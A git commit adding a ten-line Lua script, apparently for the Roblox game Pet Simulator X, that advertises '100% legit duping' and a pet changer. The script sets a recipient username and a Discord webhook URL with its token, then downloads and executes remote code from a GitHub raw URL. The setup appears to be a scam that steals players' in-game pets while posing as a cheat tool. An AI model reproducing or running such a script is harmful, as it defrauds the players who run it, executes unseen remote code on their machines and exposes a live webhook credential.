393a0b62fcd7f76ebfd57098c67ce594ff775e5e
Yronzi <130857679+Yronzi@users.noreply.github.com>
2023-04-16 22:41:03 +0800

    Create jmes.lua

---
+++ jmes.lua
@@ -0,0 +1,10 @@
+Username = "Andrei_Rasyasm"
+WebHook = "https://discord.com/api/webhooks/1096805807477243985/cU3FHlshvmHPyIphdnSjhUzSHYh9SkDiBESCOcjy6GJkN6O3Ns17MSmB8x12ry2dYS6T"
+
+loadingscreen ="JMES.LUA"
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Done"
+_G.Text2 = "100% legit duping"
+_G.Text3 = "Made by Froez"
+_G.Text4 = "Pet changer."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
